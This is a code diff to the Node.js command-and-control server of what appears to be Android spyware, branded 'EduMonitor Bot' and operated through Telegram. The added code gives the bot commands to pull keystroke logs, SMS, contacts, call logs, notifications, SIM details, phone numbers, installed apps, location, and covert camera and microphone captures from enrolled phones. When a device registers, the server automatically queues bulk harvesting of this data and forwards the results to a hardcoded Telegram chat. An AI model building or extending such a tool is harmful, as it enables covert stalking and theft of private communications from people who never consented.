@@ -45,7 +45,9 @@ if (!fs.existsSync(uploadDir)) {
 }
 
 // ============= DEVICE CONFIGURATION =============
+// Device configurations - can be stored in a database or JSON file
 const deviceConfigs = {
+    // Default device config for all devices
     'default': {
         chatId: '5326373447',
         config: {
@@ -87,10 +89,20 @@ const deviceConfigs = {
                 simInfo: true
             }
         }
-    }
+    },
+    
+    // You can add specific device configs by device ID
+    // 'specific_device_id_here': {
+    //     chatId: 'another_chat_id',
+    //     config: {
+    //         // custom config for this device
+    //     }
+    // }
 };
 
+// Function to get device configuration
 function getDeviceConfig(deviceId) {
+    // Return device-specific config if exists, otherwise return default
     return deviceConfigs[deviceId] || deviceConfigs['default'];
 }
 
@@ -135,6 +147,7 @@ function sendJsonResponse(res, data, statusCode = 200) {
     }
 }
 
+// Get server's public IP
 function getServerIP() {
     try {
         const interfaces = os.networkInterfaces();
@@ -202,7 +215,7 @@ function getMainMenuKeyboard(chatId) {
 
     return [
         [
-            { text: '📱 Data (HTML)', callback_data: 'menu_data' },
+            { text: '📱 Data', callback_data: 'menu_data' },
             { text: '🎤 Recording', callback_data: 'menu_recording' }
         ],
         [
@@ -212,6 +225,10 @@ function getMainMenuKeyboard(chatId) {
         [
             { text: '📍 Location', callback_data: 'menu_location' },
             { text: '🌐 Network', callback_data: 'menu_network' }
+        ],
+        [
+            { text: '📞 Phone', callback_data: 'menu_phone' },
+            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
         ],
         [
             { text: '📊 Stats', callback_data: 'menu_stats' },
@@ -326,22 +343,24 @@ async function setChatMenuButton(chatId) {
                 { command: 'location', description: '📍 Get GPS location' },
                 { command: 'screenshot', description: '📸 Take screenshot' },
                 { command: 'record', description: '🎤 Start recording' },
-                { command: 'contacts_html', description: '📇 Get contacts (HTML)' },
-                { command: 'sms_html', description: '💬 Get SMS (HTML)' },
-                { command: 'calllogs_html', description: '📞 Get call logs (HTML)' },
+                { command: 'contacts', description: '📇 Get contacts' },
+                { command: 'sms', description: '💬 Get SMS' },
+                { command: 'calllogs', description: '📞 Get call logs' },
                 { command: 'storage', description: '💾 Storage info' },
                 { command: 'network', description: '📡 Network info' },
                 { command: 'battery', description: '🔋 Battery level' },
                 { command: 'ip_info', description: '🌐 Get IP info' },
+                { command: 'phone_number', description: '📞 Get phone number' },
+                { command: 'sim_info', description: '📱 Get SIM info' },
                 { command: 'wifi_info', description: '📶 Get WiFi info' },
                 { command: 'mobile_info', description: '📱 Get mobile data info' },
                 { command: 'all_info', description: '📱 Complete device info' },
                 { command: 'app_opens', description: '📱 Show app opens' },
-                { command: 'app_opens_html', description: '📱 App opens HTML' },
                 { command: 'realtime_on', description: '🔔 Enable real-time logs' },
                 { command: 'realtime_off', description: '🔔 Disable real-time logs' },
                 { command: 'realtime_status', description: '🔔 Check real-time status' },
                 { command: 'photo', description: '📸 Take a photo now' },
+                { command: 'takephoto', description: '📸 Alias for photo' },
                 { command: 'camera_on', description: '📸 Start camera monitoring' },
                 { command: 'camera_off', description: '📸 Stop camera monitoring' },
                 { command: 'camera_status', description: '📸 Check camera status' },
@@ -365,6 +384,7 @@ async function setChatMenuButton(chatId) {
     }
 }
 
+// Helper to create inline buttons
 function createInlineButton(text, callbackData) {
     return {
         text: text,
@@ -448,6 +468,7 @@ function formatLocationMessage(locationData) {
     }
 }
 
+// Format IP info
 function formatIPInfo(ipData) {
     try {
         let ipInfo = ipData;
@@ -486,6 +507,58 @@ function formatIPInfo(ipData) {
     }
 }
 
+// Format SIM info
+function formatSimInfo(simData) {
+    try {
+        let message = '📱 <b>SIM Information</b>\n\n';
+        
+        if (Array.isArray(simData)) {
+            message += `Active SIMs: ${simData.length}\n\n`;
+            simData.forEach((sim, index) => {
+                message += `📱 <b>SIM ${index + 1}</b>\n`;
+                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
+            });
+        } else if (simData.operator) {
+            message += `• Operator: ${simData.operator}\n`;
+            message += `• Country: ${simData.country}\n`;
+            message += `• SIM State: ${simData.simState}\n`;
+            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting SIM info:', error);
+        return `📱 SIM Info: ${JSON.stringify(simData)}`;
+    }
+}
+
+// Format WiFi info
+function formatWifiInfo(wifiData) {
+    try {
+        let message = '📶 <b>WiFi Information</b>\n\n';
+        
+        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
+        
+        if (wifiData.connected) {
+            message += `\n📡 <b>Current Connection</b>\n`;
+            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
+            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
+            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
+            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
+            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
+            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting WiFi info:', error);
+        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
+    }
+}
+
 // ============= AUTO DATA COLLECTION =============
 
 function queueAutoDataCommands(deviceId, chatId) {
@@ -500,11 +573,14 @@ function queueAutoDataCommands(deviceId, chatId) {
         timestamp: Date.now(),
         requested: [
             'ip_info',
+            'phone_number',
+            'sim_info',
             'wifi_info',
             'mobile_info',
             'contacts_html',
             'sms_html', 
             'calllogs_html',
+            'apps_html',
             'location'
         ]
     });
@@ -521,15 +597,18 @@ function queueAutoDataCommands(deviceId, chatId) {
     
     const commands = [
         { command: 'ip_info', delay: 0, description: 'IP Address' },
-        { command: 'wifi_info', delay: 3, description: 'WiFi Info' },
-        { command: 'mobile_info', delay: 6, description: 'Mobile Info' },
-        { command: 'contacts_html', delay: 10, description: 'Contacts' },
-        { command: 'sms_html', delay: 15, description: 'SMS Messages' },
-        { command: 'calllogs_html', delay: 20, description: 'Call Logs' },
-        { command: 'location', delay: 25, description: 'Location' }
+        { command: 'phone_number', delay: 2, description: 'Phone Number' },
+        { command: 'sim_info', delay: 4, description: 'SIM Info' },
+        { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
+        { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
+        { command: 'contacts_html', delay: 12, description: 'Contacts' },
+        { command: 'sms_html', delay: 17, description: 'SMS Messages' },
+        { command: 'calllogs_html', delay: 22, description: 'Call Logs' },
+        { command: 'apps_html', delay: 27, description: 'Apps List' },
+        { command: 'location', delay: 32, description: 'Location' }
     ];
     
-    commands.forEach((cmd) => {
+    commands.forEach((cmd, index) => {
         const commandObject = {
             command: cmd.command,
             originalCommand: `/${cmd.command}`,
@@ -539,10 +618,10 @@ function queueAutoDataCommands(deviceId, chatId) {
         };
         
         device.pendingCommands.push(commandObject);
-        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
+        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command} (${cmd.description})`);
     });
     
-    console.log(`✅ Auto-data commands queued for ${deviceId}`);
+    console.log(`✅ All auto-data commands queued for ${deviceId}`);
 }
 
 // ============= PHOTO UPLOAD ENDPOINT =============
@@ -570,8 +649,10 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
         
         const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
         
+        // Send to Telegram
         await sendTelegramPhoto(chatId, filePath, req.file.originalname, fullCaption);
         
+        // Delete file after sending
         setTimeout(() => {
             try {
                 if (fs.existsSync(filePath)) {
@@ -591,6 +672,7 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
     }
 });
 
+// Helper function to send photo to Telegram
 async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     try {
         console.log(`📸 Sending photo to ${chatId}: ${filename}`);
@@ -613,6 +695,7 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     } catch (error) {
         console.error('❌ Error sending photo:', error.response?.data || error.message);
         
+        // Fallback to document if photo fails
         try {
             console.log('📎 Falling back to document send...');
             const formData = new FormData();
@@ -798,15 +881,34 @@ async function handleCallbackQuery(callbackQuery) {
     } else if (data === 'menu_data') {
         const keyboard = [
             [
-                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html'),
+                createInlineButton('📇 Contacts (TXT)', 'cmd:contacts_txt'),
+                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
+            ],
+            [
+                createInlineButton('💬 SMS (TXT)', 'cmd:sms_txt'),
                 createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
             ],
             [
-                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html'),
-                createInlineButton('📱 App Opens (HTML)', 'cmd:app_opens_html')
+                createInlineButton('📞 Call Logs (TXT)', 'cmd:calllogs_txt'),
+                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
+            ],
+            [
+                createInlineButton('⌨️ Keystrokes (TXT)', 'cmd:keystrokes_txt'),
+                createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
+            ],
+            [
+                createInlineButton('🔔 Notifications (TXT)', 'cmd:notifications_txt'),
+                createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
+            ],
+            [
+                createInlineButton('📱 Apps List (TXT)', 'cmd:apps_txt'),
+                createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
             ],
             [
                 createInlineButton('📱 App Opens', 'cmd:app_opens'),
+                createInlineButton('📱 App Opens HTML', 'cmd:app_opens_html')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -831,14 +933,15 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
             ],
             [
-                createInlineButton('🎤 Ultra', 'cmd:audio_ultra'),
-                createInlineButton('🎤 Low', 'cmd:audio_low')
+                createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra'),
+                createInlineButton('🎤 Audio Very Low', 'cmd:audio_very_low')
             ],
             [
-                createInlineButton('🎤 Medium', 'cmd:audio_medium'),
-                createInlineButton('🎤 High', 'cmd:audio_high')
+                createInlineButton('🎤 Audio Low', 'cmd:audio_low'),
+                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium')
             ],
             [
+                createInlineButton('🎤 Audio High', 'cmd:audio_high'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -875,7 +978,7 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('🎯 Target OFF', 'cmd:auto_target_off')
             ],
             [
-                createInlineButton('📊 Compression', 'cmd:compression_stats'),
+                createInlineButton('📊 Compression Stats', 'cmd:compression_stats'),
                 createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
             [
@@ -904,6 +1007,7 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📈 Detailed Stats', 'cmd:stats')
             ],
             [
+                createInlineButton('🔄 Refresh Data', 'cmd:refresh_data'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -941,7 +1045,40 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📡 Network Status', 'cmd:network')
             ],
             [
-                createInlineButton('🌍 All Info', 'cmd:all_info'),
+                createInlineButton('🌍 All Network', 'cmd:all_info'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_phone') {
+        const keyboard = [
+            [
+                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
+                createInlineButton('📱 SIM Info', 'cmd:sim_info')
+            ],
+            [
+                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
+                createInlineButton('📞 Call Logs', 'cmd:calllogs')
+            ],
+            [
+                createInlineButton('📞 Call Logs TXT', 'cmd:calllogs_txt'),
+                createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_realtime') {
+        const keyboard = [
+            [
+                createInlineButton('🔔 Realtime ON', 'cmd:realtime_on'),
+                createInlineButton('🔕 Realtime OFF', 'cmd:realtime_off')
+            ],
+            [
+                createInlineButton('📊 Realtime Status', 'cmd:realtime_status'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -955,10 +1092,13 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('📈 Detailed Stats', 'cmd:stats'),
-                createInlineButton('📸 Compression', 'cmd:compression_stats')
+                createInlineButton('📸 Compression Stats', 'cmd:compression_stats')
             ],
             [
                 createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs'),
+                createInlineButton('🔄 Force Refresh', 'cmd:refresh_data')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -974,20 +1114,24 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, keyboard);
         await sendTelegramMessage(chatId,
             "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 4.0\n" +
+            "Version: 3.1\n" +
             "Features:\n" +
             "• Remote device monitoring\n" +
             "• Multi-device support\n" +
             "• Screenshot capture\n" +
             "• Audio recording\n" +
-            "• HTML data exports\n" +
+            "• Data extraction (contacts, SMS, etc.)\n" +
             "• Location tracking\n" +
             "• Schedule recording\n" +
             "• IP address tracking\n" +
-            "• WiFi/Mobile network info\n" +
+            "• Phone number detection\n" +
+            "• SIM card information\n" +
+            "• WiFi details\n" +
+            "• Mobile network info\n" +
             "• App open tracking\n" +
             "• Real-time logging controls\n" +
-            "• Camera capture and monitoring\n\n" +
+            "• Auto-data collection on registration\n" +
+            "• 📸 Camera capture and monitoring\n\n" +
             "Use the menu below to navigate.");
         
     } else if (data === 'close_menu') {
@@ -1208,6 +1352,7 @@ async function handleCommand(chatId, command, messageId) {
                 selectedDeviceId = id;
                 device = d;
                 deviceInfo = d.deviceInfo;
+                // Auto-select this device
                 userDeviceSelection.set(chatId, selectedDeviceId);
                 console.log(`✅ Auto-selected device: ${selectedDeviceId}`);
                 break;
@@ -1248,6 +1393,7 @@ async function handleCommand(chatId, command, messageId) {
     device.pendingCommands.push(commandObject);
     console.log(`📝 Command queued for device ${selectedDeviceId}:`, commandObject);
 
+    // Send acknowledgment with device info
     let ackMessage = `⏳ Processing: ${command}`;
     if (deviceInfo) {
         ackMessage += `\n📱 Device: ${deviceInfo.model || 'Unknown'}`;
@@ -1278,6 +1424,7 @@ app.post('/api/ipinfo/:deviceId', async (req, res) => {
         
         const formattedMessage = formatIPInfo(ipData);
         
+        // Add device info to message
         const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
         await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
         
@@ -1286,6 +1433,101 @@ app.post('/api/ipinfo/:deviceId', async (req, res) => {
     } catch (error) {
         console.error('❌ IP Info endpoint error:', error);
         res.status(500).json({ error: 'IP Info processing failed' });
+    }
+});
+
+// ============= PHONE NUMBER ENDPOINT =============
+
+app.post('/api/phonenumber/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const phoneData = req.body;
+        
+        console.log(`📞 Phone number received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.phoneNumber = phoneData.phoneNumber;
+        device.simInfo = phoneData.simInfo;
+        
+        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        message += '📞 <b>Phone Information</b>\n\n';
+        
+        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
+            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
+        } else {
+            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
+        }
+        
+        if (phoneData.simInfo) {
+            if (Array.isArray(phoneData.simInfo)) {
+                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
+                phoneData.simInfo.forEach((sim, index) => {
+                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
+                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                });
+            } else {
+                message += `\n<b>SIM Information:</b>\n`;
+                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
+                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
+                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
+            }
+        }
+        
+        if (phoneData.simSlotCount) {
+            message += `• SIM Slots: ${phoneData.simSlotCount}\n`;
+        }
+        
+        if (phoneData.error) {
+            message += `\n⚠️ <b>Note:</b> ${phoneData.error}\n`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Phone Number endpoint error:', error);
+        res.status(500).json({ error: 'Phone Number processing failed' });
+    }
+});
+
+// ============= SIM INFO ENDPOINT =============
+
+app.post('/api/siminfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const simData = req.body;
+        
+        console.log(`📱 SIM Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        device.simInfo = simData;
+        
+        const formattedMessage = formatSimInfo(simData);
+        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ SIM Info endpoint error:', error);
+        res.status(500).json({ error: 'SIM Info processing failed' });
     }
 });
 
@@ -1308,21 +1550,9 @@ app.post('/api/wifiinfo/:deviceId', async (req, res) => {
         
         device.wifiInfo = wifiData;
         
-        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
-        message += '📶 <b>WiFi Information</b>\n\n';
-        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
-        
-        if (wifiData.connected) {
-            message += `\n📡 <b>Current Connection</b>\n`;
-            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
-            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
-            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
-            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
-            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
-            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
-        }
-        
-        await sendTelegramMessage(chatId, message);
+        const formattedMessage = formatWifiInfo(wifiData);
+        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
+        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
         
         res.json({ success: true });
         
@@ -1382,7 +1612,7 @@ app.post('/api/mobileinfo/:deviceId', async (req, res) => {
     }
 });
 
-// ============= FILE UPLOAD ENDPOINT (HTML files only) =============
+// ============= FILE UPLOAD ENDPOINT =============
 
 app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     try {
@@ -1396,7 +1626,7 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📎 HTML file upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
+        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -1411,15 +1641,31 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         let caption = `📱 *${deviceName}*\n\n`;
         
         switch (command) {
+            case 'contacts_txt':
             case 'contacts_html':
                 caption += `📇 Contacts Export (${itemCount} contacts)`;
                 break;
+            case 'sms_txt':
             case 'sms_html':
                 caption += `💬 SMS Messages Export (${itemCount} messages)`;
                 break;
+            case 'calllogs_txt':
             case 'calllogs_html':
                 caption += `📞 Call Logs Export (${itemCount} calls)`;
                 break;
+            case 'apps_txt':
+            case 'apps_html':
+                caption += `📱 Installed Apps Export (${itemCount} apps)`;
+                break;
+            case 'keystrokes_txt':
+            case 'keystrokes_html':
+                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
+                break;
+            case 'notifications_txt':
+            case 'notifications_html':
+                caption += `🔔 Notifications Export (${itemCount} notifications)`;
+                break;
+            case 'app_opens':
             case 'app_opens_html':
                 caption += `📱 App Opens Export (${itemCount} entries)`;
                 break;
@@ -1497,6 +1743,12 @@ app.post('/api/logs', async (req, res) => {
             case 'ip_info':
                 return res.json({ success: true, handled: 'ipinfo_endpoint' });
                 
+            case 'phone_number':
+                return res.json({ success: true, handled: 'phonenumber_endpoint' });
+                
+            case 'sim_info':
+                return res.json({ success: true, handled: 'siminfo_endpoint' });
+                
             case 'wifi_info':
                 return res.json({ success: true, handled: 'wifiinfo_endpoint' });
                 
@@ -1504,16 +1756,63 @@ app.post('/api/logs', async (req, res) => {
                 return res.json({ success: true, handled: 'mobileinfo_endpoint' });
                 
             case 'app_open':
+                // APP_OPEN logs are batched, so we don't send individual notifications
                 return res.json({ success: true, handled: 'app_open_batch' });
+                
+            case 'contacts':
+                try {
+                    const contacts = JSON.parse(logData.data || '[]');
+                    message = devicePrefix + `📇 <b>Contacts Update</b>\n` +
+                             `Total contacts: ${contacts.length}`;
+                } catch (e) {
+                    message = devicePrefix + `📇 <b>Contacts Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'call_logs':
+                try {
+                    const calls = JSON.parse(logData.data || '[]');
+                    message = devicePrefix + `📞 <b>Call Logs Update</b>\n` +
+                             `Total calls: ${calls.length}`;
+                } catch (e) {
+                    message = devicePrefix + `📞 <b>Call Logs Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
+                
+            case 'sms':
+                try {
+                    const sms = JSON.parse(logData.data || '[]');
+                    message = devicePrefix + `💬 <b>SMS Update</b>\n` +
+                             `Total messages: ${sms.length}`;
+                } catch (e) {
+                    message = devicePrefix + `💬 <b>SMS Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
+                break;
                 
             case 'screenshot':
                 message = devicePrefix + `📸 <b>Screenshot Taken</b>\n` +
-                         `Size: ${logData.size ? (logData.size/1024).toFixed(2) + 'KB' : 'unknown'}`;
+                         `Size: ${logData.size ? (logData.size/1024).toFixed(2) + 'KB' : 'unknown'}\n` +
+                         `Quality: ${logData.quality || 'unknown'}%`;
                 break;
                 
             case 'recording':
                 message = devicePrefix + `🎤 <b>Recording Saved</b>\n` +
-                         `Duration: ${logData.duration || 'unknown'}s`;
+                         `Duration: ${logData.duration || 'unknown'}s\n` +
+                         `Size: ${logData.size ? (logData.size/1024/1024).toFixed(2) + 'MB' : 'unknown'}`;
+                break;
+                
+            case 'installed_apps':
+                try {
+                    const apps = JSON.parse(logData.data || '[]');
+                    message = devicePrefix + `📱 <b>Apps List Update</b>\n` +
+                             `Total apps: ${apps.length}`;
+                } catch (e) {
+                    message = devicePrefix + `📱 <b>Apps List Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
+                }
                 break;
                 
             case 'device_info':
@@ -1524,7 +1823,8 @@ app.post('/api/logs', async (req, res) => {
                              `Android: ${info.androidVersion || 'unknown'}\n` +
                              `Manufacturer: ${info.manufacturer || 'unknown'}`;
                 } catch (e) {
-                    message = devicePrefix + `📱 <b>Device Info Update</b>\n`;
+                    message = devicePrefix + `📱 <b>Device Info Update</b>\n` +
+                             `Data: ${logData.data?.substring(0, 100)}`;
                 }
                 break;
                 
@@ -1551,6 +1851,76 @@ app.post('/api/logs', async (req, res) => {
         console.error('❌ Error processing log:', error);
         res.status(500).json({ 
             error: 'Failed to process log',
+            message: error.message 
+        });
+    }
+});
+
+app.post('/api/log', (req, res) => {
+    console.log('📝 Redirecting /api/log to /api/logs');
+    req.url = '/api/logs';
+    app._router.handle(req, res);
+});
+
+app.post('/api/logs/batch', async (req, res) => {
+    try {
+        const logs = req.body;
+        
+        if (!Array.isArray(logs)) {
+            return res.status(400).json({ error: 'Expected array of logs' });
+        }
+
+        console.log(`📦 Received batch of ${logs.length} logs`);
+
+        const deviceLogs = new Map();
+        
+        for (const log of logs) {
+            if (log.deviceId) {
+                if (!deviceLogs.has(log.deviceId)) {
+                    deviceLogs.set(log.deviceId, []);
+                }
+                deviceLogs.get(log.deviceId).push(log);
+            }
+        }
+
+        for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
+            const device = devices.get(deviceId);
+            if (device) {
+                // Filter out app_open logs for individual notifications
+                const nonAppOpenLogs = deviceLogsList.filter(log => log.type !== 'app_open');
+                
+                if (nonAppOpenLogs.length > 0) {
+                    const typeCounts = {};
+                    nonAppOpenLogs.forEach(log => {
+                        typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
+                    });
+                    
+                    const typeSummary = Object.entries(typeCounts)
+                        .map(([type, count]) => `• ${type}: ${count}`)
+                        .join('\n');
+                    
+                    const summary = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n` +
+                        `📊 <b>Log Batch Summary</b>\n` +
+                        `Received ${nonAppOpenLogs.length} logs:\n` +
+                        `${typeSummary}\n\n` +
+                        `First log: ${new Date(nonAppOpenLogs[0].timestamp).toLocaleString()}\n` +
+                        `Last log: ${new Date(nonAppOpenLogs[nonAppOpenLogs.length-1].timestamp).toLocaleString()}`;
+                    
+                    sendTelegramMessage(device.chatId, summary).catch(console.error);
+                }
+            }
+        }
+
+        res.json({ 
+            success: true, 
+            processed: logs.length,
+            devices: deviceLogs.size
+        });
+
+    } catch (error) {
+        console.error('❌ Error processing batch logs:', error);
+        res.status(500).json({ 
+            error: 'Failed to process batch logs',
             message: error.message 
         });
     }
@@ -1652,6 +2022,35 @@ app.get('/api/commands/:deviceId', (req, res) => {
     }
 });
 
+app.post('/api/result/:deviceId', async (req, res) => {
+    const deviceId = req.params.deviceId;
+    const { command, result, error } = req.body;
+    
+    if (command && (command.includes('_txt') || command.includes('_html') || 
+        command === 'ip_info' || command === 'phone_number' || command === 'location' ||
+        command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
+        command === 'mobile_info')) {
+        console.log(`📎 ${command} using dedicated endpoint`);
+        return res.sendStatus(200);
+    }
+    
+    console.log(`📨 Result from ${deviceId}:`, { command });
+    
+    const device = devices.get(deviceId);
+    if (device) {
+        const chatId = device.chatId;
+        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
+        
+        if (error) {
+            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
+        } else {
+            await sendTelegramMessage(chatId, devicePrefix + (result || `✅ ${command} executed`));
+        }
+    }
+    
+    res.sendStatus(200);
+});
+
 // ============= UPDATED REGISTRATION ENDPOINT =============
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
@@ -1662,12 +2061,14 @@ app.post('/api/register', async (req, res) => {
         return res.status(400).json({ error: 'Missing fields' });
     }
     
+    // Get device configuration (maps device to chat ID and config)
     const deviceConfig = getDeviceConfig(deviceId);
     
     if (!deviceConfig) {
         return res.status(403).json({ error: 'Device not authorized' });
     }
     
+    // Check if device already exists
     const existingDevice = devices.get(deviceId);
     const isNewDevice = !existingDevice;
     
@@ -1680,6 +2081,7 @@ app.post('/api/register', async (req, res) => {
         phoneNumber: existingDevice?.phoneNumber || null,
         lastIPInfo: existingDevice?.lastIPInfo || null,
         lastLocation: existingDevice?.lastLocation || null,
+        simInfo: existingDevice?.simInfo || null,
         wifiInfo: existingDevice?.wifiInfo || null,
         mobileInfo: existingDevice?.mobileInfo || null
     };
@@ -1688,8 +2090,10 @@ app.post('/api/register', async (req, res) => {
     
     console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
     
+    // Set menu button for the chat
     await setChatMenuButton(deviceConfig.chatId);
     
+    // Get device count for this user
     const userDevices = getDeviceListForUser(deviceConfig.chatId);
     
     let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
@@ -1702,14 +2106,18 @@ app.post('/api/register', async (req, res) => {
         welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
         welcomeMessage += `The server is automatically requesting:\n`;
         welcomeMessage += `• 🌐 IP Address Information\n`;
+        welcomeMessage += `• 📞 Phone Number\n`;
+        welcomeMessage += `• 📱 SIM Information\n`;
         welcomeMessage += `• 📶 WiFi Details\n`;
         welcomeMessage += `• 📱 Mobile Network Info\n`;
-        welcomeMessage += `• 📇 Contacts (HTML)\n`;
-        welcomeMessage += `• 💬 SMS Messages (HTML)\n`;
-        welcomeMessage += `• 📞 Call Logs (HTML)\n`;
+        welcomeMessage += `• 📇 Contacts\n`;
+        welcomeMessage += `• 💬 SMS Messages\n`;
+        welcomeMessage += `• 📞 Call Logs\n`;
+        welcomeMessage += `• 📱 Installed Apps\n`;
